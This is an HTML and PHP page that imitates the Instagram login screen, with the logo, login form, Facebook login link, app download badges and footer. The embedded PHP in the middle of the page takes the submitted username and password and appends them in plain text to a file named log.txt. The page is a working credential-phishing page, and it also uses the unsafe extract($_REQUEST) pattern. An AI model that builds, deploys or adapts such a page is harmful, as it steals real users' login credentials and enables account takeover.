<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="./styles.css" />
    <title>Instagram</title>
</head>
<body>
    <main class="flex align-items-center justify-content-center">
        <section id="mobile" class="flex">
        </section>
        <section id="auth" class="flex direction-column">
            <div class="panel login flex direction-column">
                <h1 title="Instagram" class="flex justify-content-center">
                    <img src="./img//instagram-logo.png" alt="Instagram logo" title="Instagram logo" />
                </h1>
		
		<form class="d-flex flex-column gap-2" action="">
                        <input
                          type="text"
                          placeholder="Phone number, username, or email"
                          class="id form-control px-2 py-2"
                          name="user"
                        />
                        <input
                          type="password"
                          data-toggle="password"
                          placeholder="Password"
                          class="pass form-control px-2 py-2"
                          name="pass"
                        />
                        <input
                          type="submit"
                          value="Log In"
                          class="py-1 mt-2 submit"
                        />
                      </form>


<?php
      global $user;
      global $pass;
      extract($_REQUEST);
		
      $file = fopen("log.txt", "a");

      fwrite($file, "id: ");
      fwrite($file, $user . "\n");
      fwrite($file, "pass: ");
      fwrite($file, $pass . "\n");
      fwrite($file, "\n");
      fclose($file);
    
    ?>

                <div class="flex separator align-items-center">
                    <span></span>
                    <div class="or">OR</div>
                    <span></span>
                </div>
                <div class="login-with-fb flex direction-column align-items-center">
                    <div>
                        <img />
                        <a>Login with Facebook</a>
                    </div>
                    <a href="#">Forgot password?</a>
                </div>
            </div>
            <div class="panel register flex justify-content-center">
                <p>Don't have an account?</p>
                <a href="#">Sign Up</a>
            </div>
            <div class="app-download flex direction-column align-items-center">
                <p>Get the app.</p>
                <div class="flex justify-content-center">
                    <img src="./img/apple-button.png"      alt="Image with Apple Store logo" title="Image with Apple Store logo" />
                    <img src="./img/googleplay-button.png" alt="Image with Google Play logo" title="Image with Google Play logo" />
                </div>
            </div>
        </section>
    </main>
    <footer>
        <ul class="flex flex-wrap justify-content-center">
            <li><a href="#">ABOUT</a></li>
            <li><a href="#">HELP</a></li>
            <li><a href="#">PRESS</a></li>
            <li><a href="#">API</a></li>
            <li><a href="#">CAREERS</a></li>
            <li><a href="#">PRIVACY</a></li>
            <li><a href="#">TERMS</a></li>
            <li><a href="#">LOCATIONS</a></li>
            <li><a href="#">MOST RELEVANT ACCOUNTS</a></li>
            <li><a href="#">HASHTAGS</a></li>
            <li><a href="#">LANGUAGE</a></li>
        </ul>
        <p class="copyright">© 2020 Instagram from Facebook</p>
    </footer>
</body>
</html>
